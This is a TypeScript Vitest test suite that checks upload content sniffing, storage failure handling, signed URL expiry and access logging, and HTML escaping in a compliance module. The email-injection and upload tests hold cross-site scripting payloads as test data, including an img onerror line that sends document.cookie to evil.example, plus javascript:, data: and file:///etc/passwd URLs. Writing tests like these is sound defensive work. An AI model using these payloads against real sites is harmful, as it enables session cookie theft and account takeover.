import { describe, it, expect, vi, beforeEach } from "vitest";

/**
 * @module services/complianceSecurity.test
 *
 * Adversarial security suite for the compliance module. Unit-level only —
 * mocks db and cloudinary the way documentStorageService.test.ts does, so it
 * runs in CI with no database and needs no TENANT_IT gate.
 *
 * Three surfaces, three different attackers:
 *  - upload validation (documentStorageService.sniffMime / storeDocument):
 *    the client controls filename and declared MIME, so both are ignored.
 *  - storage failure mode: missing Cloudinary credentials must be a hard 503
 *    with nothing written anywhere — middleware/upload.ts's silent public-disk
 *    fallback would be a notifiable data breach if reused here.
 *  - HTML injection in expiry-alert emails (utils/escapeHtml.ts): staff
 *    display name and rule training-provider URL are both attacker-controlled
 *    free text that lands in a manager's HTML mail client.
 */

const insertValues = vi.fn().mockResolvedValue(undefined);
vi.mock("../db/index.js", () => ({
  db: {
    insert: vi.fn(() => ({ values: insertValues })),
  },
}));

const uploadStream = vi.fn();
const privateDownloadUrl = vi.fn(() => "https://signed.example/doc.pdf");
const configure = vi.fn();
vi.mock("cloudinary", () => ({
  v2: {
    config: (...a: unknown[]) => configure(...a),
    uploader: {
      upload_stream: (...a: unknown[]) => uploadStream(...a),
      destroy: vi.fn(),
    },
    utils: { private_download_url: (...a: unknown[]) => privateDownloadUrl(...a) },
  },
}));

const getCredential = vi.fn();
vi.mock("./credentialService.js", () => ({
  getCredentialValueWithFallback: (...a: unknown[]) => getCredential(...a),
}));

import {
  sniffMime,
  storeDocument,
  signedUrlForDocument,
  DocumentStorageError,
  SIGNED_URL_TTL_SECONDS,
} from "./documentStorageService.js";
import { escapeHtml, safeHttpUrl } from "../utils/escapeHtml.js";

/** All three Cloudinary credentials present. */
function credsOk() {
  getCredential.mockResolvedValue("set");
}
/** No credentials at all — the case that must never fall back to disk. */
function credsMissing() {
  getCredential.mockResolvedValue(undefined);
}

const PDF_HEADER = Buffer.from([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37, 0, 0, 0, 0]);

beforeEach(() => {
  vi.clearAllMocks();
  insertValues.mockResolvedValue(undefined);
  uploadStream.mockImplementation((_opts: unknown, cb: (e: unknown, r: unknown) => void) => ({
    end: () => cb(null, { public_id: "culinaire/compliance/org-2/abc" }),
  }));
});

describe("upload validation — content wins, filename and declared MIME are ignored", () => {
  it("rejects an SVG carrying a <script> tag", () => {
    const svgWithScript = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>',
    );
    expect(sniffMime(svgWithScript)).toBeNull();
  });

  it("identifies a PDF by magic bytes even though the caller claims it is a .jpg", () => {
    // sniffMime takes only the buffer — there is no filename/declared-MIME
    // parameter to spoof in the first place. Same bytes, same verdict,
    // regardless of what an attacker names the file or sends as Content-Type.
    expect(sniffMime(PDF_HEADER)).toBe("application/pdf");
  });

  it("rejects a truncated PDF header (magic bytes cut short)", () => {
    expect(sniffMime(Buffer.from([0x25, 0x50, 0x44]))).toBeNull();
  });

  it("rejects a polyglot that opens with an unrecognised signature", () => {
    // GIF89a header — not one of the three accepted types.
    const gif = Buffer.from([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0, 0, 0, 0, 0, 0]);
    expect(sniffMime(gif)).toBeNull();
  });

  it("rejects an HTML file even when it is named report.png", () => {
    const html = Buffer.from("<!DOCTYPE html><html><body><script>evil()</script></body></html>");
    expect(sniffMime(html)).toBeNull();
  });

  it("storeDocument rejects an HTML-as-.png upload with 415, before touching storage", async () => {
    credsOk();
    const html = Buffer.from("<!DOCTYPE html><html><body>hi</body></html>");
    await expect(storeDocument(html, 2)).rejects.toMatchObject({
      status: 415,
      code: "UNSUPPORTED_MEDIA_TYPE",
    });
    expect(uploadStream).not.toHaveBeenCalled();
  });

  it("rejects a zero-byte upload before even checking credentials", async () => {
    credsOk();
    await expect(storeDocument(Buffer.alloc(0), 2)).rejects.toMatchObject({
      status: 400,
      code: "EMPTY_UPLOAD",
    });
    // Empty-buffer check runs before the credential lookup and before storage.
    expect(getCredential).not.toHaveBeenCalled();
    expect(uploadStream).not.toHaveBeenCalled();
  });
});

describe("storage failure mode — missing credentials never fall back to disk", () => {
  it("hard-fails 503 and writes nothing when credentials are entirely absent", async () => {
    credsMissing();
    await expect(storeDocument(PDF_HEADER, 2)).rejects.toBeInstanceOf(DocumentStorageError);
    await expect(storeDocument(PDF_HEADER, 2)).rejects.toMatchObject({
      status: 503,
      code: "STORAGE_UNCONFIGURED",
    });
    expect(uploadStream).not.toHaveBeenCalled();
    expect(configure).not.toHaveBeenCalled();
  });

  it("hard-fails 503 when only the API secret is missing (partial credentials are not enough)", async () => {
    getCredential.mockImplementation((key: string) =>
      Promise.resolve(key === "CLOUDINARY_API_SECRET" ? undefined : "set"),
    );
    await expect(storeDocument(PDF_HEADER, 2)).rejects.toMatchObject({
      status: 503,
      code: "STORAGE_UNCONFIGURED",
    });
    expect(uploadStream).not.toHaveBeenCalled();
  });
});

describe("signed URLs", () => {
  it("uses the explicit 120-second TTL, not Cloudinary's 1-hour default", async () => {
    credsOk();
    const before = Math.floor(Date.now() / 1000);
    await signedUrlForDocument({
      complianceDocumentId: "doc-1",
      publicId: "pid",
      format: "pdf",
      actorUserId: 5,
      granted: true,
    });
    expect(SIGNED_URL_TTL_SECONDS).toBe(120);
    const opts = privateDownloadUrl.mock.calls[0][2] as { expires_at: number };
    expect(opts.expires_at).toBeLessThanOrEqual(before + 120 + 5);
    expect(opts.expires_at).toBeGreaterThanOrEqual(before + 120);
  });

  it("a denied access writes a document_access_log row and returns no URL", async () => {
    credsOk();
    const url = await signedUrlForDocument({
      complianceDocumentId: "doc-1",
      publicId: "pid",
      format: "pdf",
      actorUserId: 9,
      ipAddress: "203.0.113.9",
      granted: false,
    });
    expect(url).toBeNull();
    expect(privateDownloadUrl).not.toHaveBeenCalled();
    expect(insertValues).toHaveBeenCalledTimes(1);
    expect(insertValues).toHaveBeenCalledWith(
      expect.objectContaining({
        complianceDocumentId: "doc-1",
        actorUserId: 9,
        outcome: "denied",
        ipAddress: "203.0.113.9",
      }),
    );
  });

  it("a granted access writes a granted row and returns the signed URL", async () => {
    credsOk();
    const url = await signedUrlForDocument({
      complianceDocumentId: "doc-2",
      publicId: "pid-2",
      format: "pdf",
      actorUserId: 5,
      granted: true,
    });
    expect(url).toBe("https://signed.example/doc.pdf");
    expect(insertValues).toHaveBeenCalledWith(
      expect.objectContaining({ complianceDocumentId: "doc-2", actorUserId: 5, outcome: "granted" }),
    );
  });
});

describe("HTML injection in expiry-alert emails", () => {
  it("escapes an <img onerror> staff display name", () => {
    const malicious = '<img src=x onerror="fetch(`//evil.example?c=`+document.cookie)">';
    const escaped = escapeHtml(malicious);
    // escapeHtml escapes, it does not strip (see module doc comment) — the
    // literal text "onerror=" surviving is fine because the angle brackets
    // around it are neutralised, so no browser ever parses it as a tag.
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toMatch(/<[a-z]/i);
    expect(escaped).toBe(
      "&lt;img src=x onerror=&quot;fetch(`//evil.example?c=`+document.cookie)&quot;&gt;",
    );
  });

  it("escapes quotes and apostrophes so attribute contexts stay safe", () => {
    expect(escapeHtml(`O'Brien says "hi"`)).toBe("O&#39;Brien says &quot;hi&quot;");
  });

  it("rejects a javascript: trainingProviderUrl", () => {
    expect(safeHttpUrl("javascript:alert(document.cookie)")).toBeNull();
  });

  it("rejects a data: trainingProviderUrl", () => {
    expect(safeHttpUrl("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==")).toBeNull();
  });

  it("rejects other executable-looking schemes (vbscript:, file:)", () => {
    expect(safeHttpUrl("vbscript:msgbox(1)")).toBeNull();
    expect(safeHttpUrl("file:///etc/passwd")).toBeNull();
  });

  it("passes through a legitimate https URL", () => {
    expect(safeHttpUrl("https://training.example.com/rsa-renewal")).toBe(
      "https://training.example.com/rsa-renewal",
    );
  });

  it("passes through a legitimate http URL", () => {
    expect(safeHttpUrl("http://training.example.com/rsa-renewal")).toBe(
      "http://training.example.com/rsa-renewal",
    );
  });

  it("rejects null/undefined/empty rather than throwing", () => {
    expect(safeHttpUrl(null)).toBeNull();
    expect(safeHttpUrl(undefined)).toBeNull();
    expect(safeHttpUrl("")).toBeNull();
  });
});
